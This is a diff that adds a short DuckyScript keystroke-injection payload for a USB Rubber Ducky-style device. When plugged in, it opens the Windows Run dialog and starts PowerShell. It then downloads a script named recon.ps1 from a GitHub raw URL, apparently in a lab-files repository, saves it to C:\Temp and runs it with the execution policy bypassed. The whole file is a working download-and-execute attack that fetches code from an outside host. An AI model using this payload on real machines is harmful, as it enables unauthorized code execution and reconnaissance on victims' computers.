@@ -1,0 +1,29 @@
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoProfile
+ENTER
+DELAY 1000
+
+STRING $u="https://raw.githubusercontent.com/butlersl/305-lab-files/main/recon.ps1"
+ENTER
+DELAY 300
+
+STRING $dir="C:\Temp"
+ENTER
+DELAY 300
+
+STRING New-Item -ItemType Directory -Force -Path $dir | Out-Null
+ENTER
+DELAY 500
+
+STRING $p="C:\Temp\recon.ps1"
+ENTER
+DELAY 300
+
+STRING Invoke-WebRequest -Uri $u -OutFile $p
+ENTER
+DELAY 1500
+
+STRING powershell -NoProfile -ExecutionPolicy Bypass -File $p -DuckyDrive $dir
+ENTER
